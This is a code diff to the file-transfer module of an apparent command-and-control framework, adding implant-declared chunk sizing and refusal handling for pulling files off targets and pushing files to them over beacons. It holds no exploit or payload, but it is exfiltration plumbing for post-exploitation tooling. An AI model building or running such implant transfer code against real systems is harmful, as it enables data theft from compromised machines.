@@ -15,6 +15,9 @@ The rules this module keeps:
   Base64 that fails to decode must not become a zero-byte file.
 * Transfers stream: a chunk is written before the next is requested, so a large
   target-side file costs the operator a file handle, not a second copy of RAM.
+* Chunk size is asked for, not assumed. Each agent reads with a buffer of its
+  own and says how big it is, so the loop that moves a 100 MB file is the same
+  loop for a Python stub and a 64 KB C implant — only the number of trips changes.
 """
 from __future__ import annotations
 
@@ -26,12 +29,22 @@ import os
 import time
 from typing import Any, Callable, Dict, Optional
 
+from pupyteer.server.sessions.capabilities import DEFAULT_MAX_LINE
+
 logger = logging.getLogger("pupyteer.sessions.transfer")
 
-# One chunk per round trip. Big enough that a 100 MB file is a sane number of
-# beacons, small enough that the base64 stays inside the listener's message
-# ceiling on both ends.
+# One chunk per round trip when the agent puts no ceiling on it. Big enough that a
+# 100 MB file is a sane number of beacons, small enough that the base64 stays
+# inside the listener's message ceiling on both ends.
 DEFAULT_CHUNK_SIZE = 512 * 1024
+
+# What a declared line has to hold besides file data: the command envelope, the
+# ids, the escaped task JSON and the path. Generous on purpose — the cost of
+# being wrong in this direction is one more round trip, and the cost of being
+# wrong in the other is a chunk the agent cannot read. At the Windows implant's
+# 64 KB this leaves 47.6 KB of file data per beacon, against a line that reaches
+# about 63.7 KB once base64 and framing are counted.
+LINE_FRAMING_ALLOWANCE = 2048
 
 # The agent picks commands up when it next checks in, so the wait is bounded by
 # the beacon interval, not by how fast the target disk is.
@@ -116,10 +129,50 @@ async def run_action(
     try:
         payload = json.loads(answer)
     except (json.JSONDecodeError, TypeError):
-        return {"error": f"agent returned an unreadable reply: {answer[:200]}"}
+        # Two things land here: an implant that answered in prose nobody asked
+        # for, and the queue answering on an implant's behalf — a tasking outside
+        # the session's declared capabilities is refused as a sentence, in the
+        # server, before it is ever sent. Neither is the agent's reply, so the
+        # message says whose answer it is not rather than putting words on it.
+        return {"error": f"no structured reply for {task.get('action', 'the task')}: "
+                         f"{answer[:400]}"}
     if not isinstance(payload, dict):
         return {"error": f"agent returned {type(payload).__name__}, expected an object"}
     return payload
+
+
+async def chunk_budget(
+    session_manager: Any, session_id: str, chunk_size: int = DEFAULT_CHUNK_SIZE
+) -> int:
+    """Largest number of file bytes that fit one chunk on this session.
+
+    A chunk is asked for, and answered, as a single line. The implant reads with
+    a fixed buffer and says how big it is at registration, so the ceiling on a
+    chunk is the smaller of what this module would like and what the agent said
+    it can hold — base64 costs four bytes per three, and the envelope costs the
+    rest. Sending a bigger chunk than that is not a transfer that fails loudly:
+    the line is dropped where the server cannot see it, and the next thing the
+    operator reads is a short file with a check mark next to it.
+    """
+    session = await session_manager.get(session_id)
+    declared = getattr(session, "max_line", 0) or DEFAULT_MAX_LINE
+    usable_line = declared - LINE_FRAMING_ALLOWANCE
+    return min(chunk_size, max(usable_line, 0) * 3 // 4)
+
+
+def _line_too_small(session_id: str) -> Dict[str, Any]:
+    """Refuse a transfer the agent's own announced buffer cannot carry.
+
+    An implant that reads lines shorter than the request envelope cannot accept a
+    file chunk at all, and starting the loop anyway would spend a whole timeout
+    per chunk to move nothing.
+    """
+    return {
+        "status": "error",
+        "bytes": 0,
+        "error": f"session {session_id} declared a read line too small to carry "
+                 f"a file chunk; nothing was transferred",
+    }
 
 
 async def pull(
@@ -132,6 +185,9 @@ async def pull(
     progress: Progress = None,
 ) -> Dict[str, Any]:
     """Read ``remote`` off the target into the open binary ``sink``, in chunks."""
+    chunk_size = await chunk_budget(session_manager, session_id, chunk_size)
+    if chunk_size <= 0:
+        return _line_too_small(session_id)
     offset = 0
     total = -1
     while True:
@@ -181,6 +237,10 @@ async def push(
     """Send the local file ``local`` to ``remote`` on the target, in chunks."""
     if not os.path.isfile(local):
         return {"status": "error", "error": f"local file not found: {local}"}
+
+    chunk_size = await chunk_budget(session_manager, session_id, chunk_size)
+    if chunk_size <= 0:
+        return _line_too_small(session_id)
 
     size = os.path.getsize(local)
     offset = 0
